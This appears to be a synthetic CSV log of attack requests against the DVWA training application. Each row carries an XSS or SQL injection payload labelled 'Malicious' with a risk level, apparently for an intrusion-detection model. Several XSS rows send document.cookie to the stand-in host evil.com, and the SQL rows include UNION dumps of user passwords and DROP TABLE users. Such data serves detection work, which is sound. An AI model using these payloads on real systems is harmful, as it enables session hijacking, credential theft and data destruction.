timestamp,ip,method,url,status,user_agent,attack_type,prediction,risk_level
04/Jul/2026:18:38:04 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:38:00 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:37:58 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:37:56 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:37:49 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:37:46 +0530,192.168.1.164,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:37:43 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:37:42 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:37:40 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:37:32 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:37:26 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:37:18 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:37:16 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:37:14 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:37:08 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:37:01 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:36:54 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:36:49 +0530,10.0.0.13,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:36:45 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,403,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:36:43 +0530,192.168.1.164,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:36:36 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:36:32 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:36:29 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:36:22 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:36:21 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:36:15 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:36:08 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:36:01 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:35:59 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:35:51 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:35:50 +0530,192.168.1.151,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:35:44 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:35:40 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:35:38 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,403,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:35:31 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:35:27 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:35:19 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:35:14 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:35:07 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:34:59 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:34:51 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:34:47 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:34:42 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:34:40 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:34:32 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:34:25 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:34:21 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,403,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:34:14 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:34:06 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:34:01 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:33:54 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:33:53 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,XSS,Malicious,Medium
04/Jul/2026:18:33:47 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:33:40 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:33:32 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,sqlmap/1.7.2#stable (http://sqlmap.org),XSS,Malicious,Medium
04/Jul/2026:18:33:27 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:33:21 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:33:19 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:33:15 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:33:08 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:33:06 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,XSS,Malicious,Medium
04/Jul/2026:18:33:04 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:33:03 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,XSS,Malicious,Medium
04/Jul/2026:18:33:01 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,curl/8.1.2,XSS,Malicious,Medium
04/Jul/2026:18:33:00 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:32:59 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,500,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:32:56 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,python-requests/2.31.0,XSS,Malicious,Medium
04/Jul/2026:18:32:48 +0530,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,Hydra/9.4,XSS,Malicious,Medium
04/Jul/2026:18:32:40 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,python-requests/2.31.0,SQL Injection,Malicious,High
04/Jul/2026:18:32:35 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,curl/8.1.2,SQL Injection,Malicious,High
04/Jul/2026:18:32:29 +0530,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:32:28 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,SQL Injection,Malicious,High
04/Jul/2026:18:32:22 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,Hydra/9.4,SQL Injection,Malicious,High
04/Jul/2026:18:32:15 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,SQL Injection,Malicious,High
04/Jul/2026:18:32:10 +0530,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,SQL Injection,Malicious,High
04/Jul/2026:18:32:07 +0530,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,python-requests/2.31.0,SQL Injection,Malicious,High
04/Jul/2026:18:32:00 +0530,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,SQL Injection,Malicious,High
04/Jul/2026:18:31:52 +0530,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:31:44 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,curl/8.1.2,SQL Injection,Malicious,High
04/Jul/2026:18:31:42 +0530,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,curl/8.1.2,SQL Injection,Malicious,High
04/Jul/2026:18:31:34 +0530,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,SQL Injection,Malicious,High
04/Jul/2026:18:31:26 +0530,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,curl/8.1.2,SQL Injection,Malicious,High
04/Jul/2026:18:31:22 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,SQL Injection,Malicious,High
04/Jul/2026:18:31:19 +0530,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,SQL Injection,Malicious,High
04/Jul/2026:18:31:16 +0530,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:31:14 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,SQL Injection,Malicious,High
04/Jul/2026:18:31:12 +0530,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,SQL Injection,Malicious,High
04/Jul/2026:18:31:09 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,Hydra/9.4,SQL Injection,Malicious,High
04/Jul/2026:18:31:01 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,SQL Injection,Malicious,High
04/Jul/2026:18:30:54 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,curl/8.1.2,SQL Injection,Malicious,High
04/Jul/2026:18:30:47 +0530,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,500,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:30:41 +0530,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,SQL Injection,Malicious,High
04/Jul/2026:18:30:37 +0530,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:30:34 +0530,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,sqlmap/1.7.2#stable (http://sqlmap.org),SQL Injection,Malicious,High
04/Jul/2026:18:30:26 +0530,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,SQL Injection,Malicious,High
04/Jul/2026:18:30:20 +0530,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,SQL Injection,Malicious,High
04/Jul/2026:18:30:16 +0530,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,curl/8.1.2,SQL Injection,Malicious,High
